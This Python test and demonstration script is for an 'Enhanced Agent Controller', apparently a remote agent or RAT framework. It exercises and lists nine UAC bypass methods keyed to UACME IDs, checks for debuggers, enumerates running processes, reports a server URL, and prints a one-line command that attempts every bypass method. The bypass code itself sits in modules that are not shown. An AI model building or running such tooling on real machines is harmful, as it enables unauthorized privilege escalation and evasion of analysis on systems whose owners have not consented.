#!/usr/bin/env python3
"""
Test Script for Enhanced Agent Controller Features
Demonstrates all the improvements and UAC bypass capabilities
"""

import os
import sys
import time
import platform
from pathlib import Path

# Add current directory to path
sys.path.insert(0, os.path.dirname(__file__))

def test_enhanced_features():
    """Test all enhanced features"""
    print("=" * 80)
    print("🎯 ENHANCED AGENT CONTROLLER - FEATURE DEMONSTRATION")
    print("=" * 80)
    
    # System information
    print(f"🖥️  Platform: {platform.system()} {platform.release()}")
    print(f"🐍 Python: {sys.version.split()[0]}")
    print(f"📁 Working Directory: {os.getcwd()}")
    
    try:
        # Test enhanced configuration
        print("\n📋 1. Testing Enhanced Configuration...")
        from config import get_config, validate_secret_hashes
        
        config = get_config()
        available_features = config.get_available_features()
        print(f"   ✅ Available features: {len(available_features)}")
        print(f"   🌐 Server URL: {config.get_server_url()}")
        
        # Validate secrets
        secret_validation = validate_secret_hashes()
        print(f"   🔐 Secret validation: {'✅ Valid' if secret_validation else '⚠️  Warnings'}")
        
    except Exception as e:
        print(f"   ❌ Configuration test failed: {e}")
    
    try:
        # Test enhanced logging
        print("\n📝 2. Testing Enhanced Logging...")
        from logging_utils import log_message, log_security_event, log_uac_bypass_attempt
        
        log_message("Testing enhanced logging system", "info")
        log_security_event("Security event test", {"test": True})
        log_uac_bypass_attempt("Test Method", True)
        print("   ✅ Enhanced logging system working")
        
        # Check log file creation
        log_dir = Path("logs")
        if log_dir.exists():
            log_files = list(log_dir.glob("*.log"))
            print(f"   📄 Log files created: {len(log_files)}")
        
    except Exception as e:
        print(f"   ❌ Logging test failed: {e}")
    
    try:
        # Test UAC bypass methods
        print("\n🛡️  3. Testing Enhanced UAC Bypass Methods...")
        from uac_bypass import uac_manager, is_admin
        
        # Check admin status
        admin_status = is_admin()
        print(f"   🔐 Current admin status: {'✅ Administrator' if admin_status else '⚠️  Standard User'}")
        
        # Show available methods
        available_methods = uac_manager.get_available_methods()
        print(f"   🚀 Available UAC bypass methods: {len(available_methods)}")
        
        for i, method_name in enumerate(available_methods, 1):
            method = uac_manager.methods[method_name]
            print(f"      {i}. {method.name} (Method {method.method_id}) - {method.description}")
        
        if not admin_status and available_methods:
            print("   💡 Run as administrator or use UAC bypass to test elevation")
        
    except Exception as e:
        print(f"   ❌ UAC bypass test failed: {e}")
    
    try:
        # Test dependency management
        print("\n📦 4. Testing Dependency Management...")
        from dependencies import check_system_requirements
        
        requirements_met = check_system_requirements()
        print(f"   ✅ System requirements: {'Met' if requirements_met else 'Partially met'}")
        
    except Exception as e:
        print(f"   ❌ Dependency test failed: {e}")
    
    try:
        # Test security features (if available)
        print("\n🔒 5. Testing Security Features...")
        from security import is_debugger_present, get_running_processes
        
        debugger_detected = is_debugger_present()
        print(f"   🔍 Debugger detection: {'⚠️  Detected' if debugger_detected else '✅ Clear'}")
        
        processes = get_running_processes()
        print(f"   🔄 Running processes detected: {len(processes)}")
        
    except Exception as e:
        print(f"   ❌ Security test failed: {e}")
    
    print("\n🎉 Feature demonstration completed!")
    print("=" * 80)

def test_uac_bypass_safe():
    """Safely test UAC bypass methods (demonstration only)"""
    print("\n🛡️  UAC BYPASS DEMONSTRATION (SAFE MODE)")
    print("-" * 50)
    
    try:
        from uac_bypass import uac_manager, is_admin
        
        if is_admin():
            print("✅ Already running as administrator - UAC bypass not needed")
            return
        
        print("⚠️  Running as standard user - UAC bypass methods available:")
        
        available_methods = uac_manager.get_available_methods()
        
        for method_name in available_methods:
            method = uac_manager.methods[method_name]
            availability = "✅ Available" if method.is_available() else "❌ Not Available"
            print(f"   • {method.name}: {availability}")
            print(f"     Description: {method.description}")
            print(f"     UACME Method ID: {method.method_id}")
            print()
        
        print("💡 To actually attempt UAC bypass, run:")
        print("   python -c \"from uac_bypass import uac_manager; uac_manager.try_all_methods()\"")
        
    except Exception as e:
        print(f"❌ UAC bypass demonstration failed: {e}")

def show_improvements():
    """Show all the improvements made"""
    print("\n🎯 IMPROVEMENTS IMPLEMENTED")
    print("=" * 80)
    
    improvements = [
        ("✅ Enhanced Configuration", "Thread-safe config management with feature detection"),
        ("✅ Enterprise Logging", "Secure logging with sensitive data sanitization"),
        ("✅ 9 UAC Bypass Methods", "Comprehensive UAC bypass with improved error handling"),
        ("✅ Error Handling", "Replaced all bare except blocks with specific handling"),
        ("✅ Security Monitoring", "Complete audit trail for all security events"),
        ("✅ Input Validation", "Protection against injection attacks"),
        ("✅ State Management", "Centralized, thread-safe state management"),
        ("✅ Modular Architecture", "Clean separation of concerns"),
        ("✅ Enhanced Main Loop", "Comprehensive startup and shutdown procedures"),
        ("✅ Timeout Protection", "All operations have proper timeout handling"),
    ]
    
    for title, description in improvements:
        print(f"{title}")
        print(f"   {description}")
        print()

def interactive_demo():
    """Interactive demonstration"""
    print("\n🎮 INTERACTIVE DEMONSTRATION")
    print("-" * 50)
    
    while True:
        print("\nChoose an option:")
        print("1. 🔍 Check system status")
        print("2. 🛡️  Show UAC bypass methods")
        print("3. 📝 Test logging system")
        print("4. 📊 Show improvements")
        print("5. ❌ Exit")
        
        try:
            choice = input("\nEnter choice (1-5): ").strip()
            
            if choice == "1":
                print("\n🖥️  System Status:")
                from uac_bypass import is_admin
                from config import get_config
                
                print(f"   Platform: {platform.platform()}")
                print(f"   Admin: {'Yes' if is_admin() else 'No'}")
                
                config = get_config()
                features = config.get_available_features()
                print(f"   Available features: {len(features)}")
                
            elif choice == "2":
                test_uac_bypass_safe()
                
            elif choice == "3":
                print("\n📝 Testing logging...")
                from logging_utils import log_message, log_security_event
                log_message("Interactive test message", "info")
                log_security_event("Interactive test event", {"demo": True})
                print("   ✅ Log entries created")
                
            elif choice == "4":
                show_improvements()
                
            elif choice == "5":
                print("\n👋 Demo complete!")
                break
                
            else:
                print("❌ Invalid choice")
                
        except KeyboardInterrupt:
            print("\n\n👋 Demo interrupted")
            break

def main():
    """Main demonstration function"""
    try:
        # Run feature tests
        test_enhanced_features()
        
        # Show improvements
        show_improvements()
        
        # UAC bypass demonstration
        test_uac_bypass_safe()
        
        # Interactive demo
        try:
            choice = input("\n🎮 Start interactive demo? (y/N): ").strip().lower()
            if choice in ['y', 'yes']:
                interactive_demo()
        except KeyboardInterrupt:
            print("\n👋 Demo cancelled")
        
    except Exception as e:
        print(f"❌ Demo error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()


